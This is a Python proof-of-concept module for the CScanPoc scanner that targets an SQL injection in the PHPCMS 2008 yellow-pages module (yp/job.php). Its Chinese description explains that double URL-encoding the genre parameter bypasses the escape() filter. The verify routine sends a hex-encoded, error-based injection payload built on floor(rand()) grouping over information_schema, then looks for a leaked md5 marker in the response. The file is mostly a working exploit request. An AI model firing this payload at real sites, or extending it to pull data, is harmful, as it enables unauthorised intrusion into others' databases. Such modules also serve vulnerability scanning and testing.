# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType

class Vuln(ABVuln):
    vuln_id = 'PHPCMS_0013' # 平台漏洞编号，留空
    name = 'PHPCMS 2008黄页模块 SQL注入漏洞'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION # 漏洞类型
    disclosure_date = '2014-11-30'  # 漏洞公布时间
    desc = '''
        common.inc.php文件代码第72行$action、genre变量由GET方式获得，然后载入escape()方法进行过滤。
        执行代码第76行，用extract()方法将$_GET得到的数组拆分为变量。执行job.php文件代码第80行，拼接完成SQL语句，带入数据库进行查询。
        如果$genre变量进行二次URL编码即可绕过escape()方法的过滤，导致SQL注入漏洞产生。
    '''  # 漏洞描述
    ref = 'http://vul.jdsec.com/index.php/vul/JDSEC-POC-20141129-4547'  # 漏洞来源
    cnvd_id = 'Unkonwn'  # cnvd漏洞编号
    cve_id = 'Unkonwn'  # cve编号
    product = 'PHPCMS'  # 漏洞应用名称
    product_version = 'PHPCMS 2008'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = '76e7df11-93dd-404d-82e5-6e52c66202d5'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-15'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
                 
            payload = '/yp/job.php?action=list&genre=a%2527%2B%61%6E%64%28%73%65%6C%65%63%74%20%31%20%66%72%6F%6D%28%73%65%6C%65%63%74%20%63%6F%75%6E%74%28%2A%29%2C%63%6F%6E%63%61%74%28%28%73%65%6C%65%63%74%20%28%73%65%6C%65%63%74%20%28%73%65%6C%65%63%74%20%63%6F%6E%63%61%74%28%30%78%37%65%2C%6D%64%35%28%33%2E%31%34%31%35%29%2C%30%78%37%65%29%29%29%20%66%72%6F%6D%20%69%6E%66%6F%72%6D%61%74%69%6F%6E%5F%73%63%68%65%6D%61%2E%74%61%62%6C%65%73%20%6C%69%6D%69%74%20%30%2C%31%29%2C%66%6C%6F%6F%72%28%72%61%6E%64%28%30%29%2A%32%29%29%78%20%66%72%6F%6D%20%69%6E%66%6F%72%6D%61%74%69%6F%6E%5F%73%63%68%65%6D%61%2E%74%61%62%6C%65%73%20%67%72%6F%75%70%20%62%79%20%78%29%61%29%23'
            r = requests.get(self.target + payload)
            
            if r.text.find('63e1f04640e83605c1d177544a5a0488') != -1:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()

if __name__ == '__main__':
    Poc().run()
